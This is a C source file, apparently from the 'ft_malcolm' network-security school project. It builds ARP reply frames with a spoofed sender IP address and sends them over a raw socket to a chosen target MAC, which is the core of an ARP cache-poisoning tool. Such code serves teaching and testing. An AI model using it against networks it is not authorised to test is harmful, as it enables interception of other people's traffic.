#include "ft_malcolm.h"
#include "libft.h"
#include "packet_utils.h"
#include <net/if.h>

void create_arp_packet(unsigned char *packet, t_args *args, const char *src_mac,
					   const char *spoofed_ip, const char *target_mac,
					   const char *target_ip)
{
	// === Ethernet Header ===
	unsigned char *eth = packet;
	unsigned char *arp = (unsigned char *)pkt_arp_payload(packet);

	sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth[0], &eth[1],
		   &eth[2], &eth[3], &eth[4], &eth[5]);

	sscanf(args->source_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &eth[6], &eth[7],
		   &eth[8], &eth[9], &eth[10], &eth[11]);

	// ARP type
	eth[12] = 0x08;
	eth[13] = 0x06;

	// === ARP Header ===
	ft_memset(arp, 0, ARP_HDR_LEN);
	/* Hardware type and protocol type (network byte order) */
	uint16_t htype = htons(ARP_HTYPE_ETH);
	ft_memcpy(arp + 0, &htype, sizeof(htype));
	uint16_t ptype = htons(ARP_PTYPE_IPV4);
	ft_memcpy(arp + 2, &ptype, sizeof(ptype));
	/* Hardware / Protocol sizes */
	arp[4] = ARP_HLEN_ETH;
	arp[5] = ARP_PLEN_IPV4;
	/* Opcode (network byte order) */
	uint16_t opcode = htons(ARP_OPCODE_REPLY);
	ft_memcpy(arp + ARP_OPCODE_OFFSET, &opcode, sizeof(opcode));

	// src MAC
	sscanf(src_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arp[ARP_SRC_MAC_OFFSET],
		   &arp[ARP_SRC_MAC_OFFSET + 1], &arp[ARP_SRC_MAC_OFFSET + 2],
		   &arp[ARP_SRC_MAC_OFFSET + 3], &arp[ARP_SRC_MAC_OFFSET + 4],
		   &arp[ARP_SRC_MAC_OFFSET + 5]);

	// src IP
	inet_pton(AF_INET, spoofed_ip, arp + ARP_SRC_IP_OFFSET);

	// Target MAC
	sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		   &arp[ARP_TARGET_MAC_OFFSET], &arp[ARP_TARGET_MAC_OFFSET + 1],
		   &arp[ARP_TARGET_MAC_OFFSET + 2], &arp[ARP_TARGET_MAC_OFFSET + 3],
		   &arp[ARP_TARGET_MAC_OFFSET + 4], &arp[ARP_TARGET_MAC_OFFSET + 5]);

	// Target IP
	inet_pton(AF_INET, target_ip, arp + ARP_TARGET_IP_OFFSET);
}

int send_arp_packet_raw(int sockfd, t_args *args, const unsigned char *packet,
						const char *target_mac)
{
	struct sockaddr_ll sll;
	ft_memset(&sll, 0, sizeof(struct sockaddr_ll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = if_nametoindex(args->ifname);
	sll.sll_halen = ETH_ALEN;

	uint8_t dest_mac[6];
	sscanf(target_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &dest_mac[0], &dest_mac[1], &dest_mac[2], &dest_mac[3], &dest_mac[4], &dest_mac[5]);
	ft_memcpy(sll.sll_addr, dest_mac, 6);

	if (sendto(sockfd, packet, ARP_PACKET_MIN_LEN, 0, (struct sockaddr *)&sll,
			   sizeof(sll))
		< 0)
	{
		perror("sendto ARP packet");
		return (1);
	}
	return (0);
}

int send_arp_reply(int sockfd, t_args *args, char *src_mac, char *spoofed_ip,
				   char *target_mac, char *target_ip, bool print_verbose)
{
	unsigned char packet[ARP_PACKET_MIN_LEN];

	create_arp_packet(packet, args, src_mac, spoofed_ip, target_mac, target_ip);
	if (send_arp_packet_raw(sockfd, args, packet, target_mac))
		return (1);

	if (args->verbose && print_verbose)
		print_sent_arp_reply(args->ifname, src_mac, spoofed_ip, target_mac,
							 target_ip);

	return (0);
}
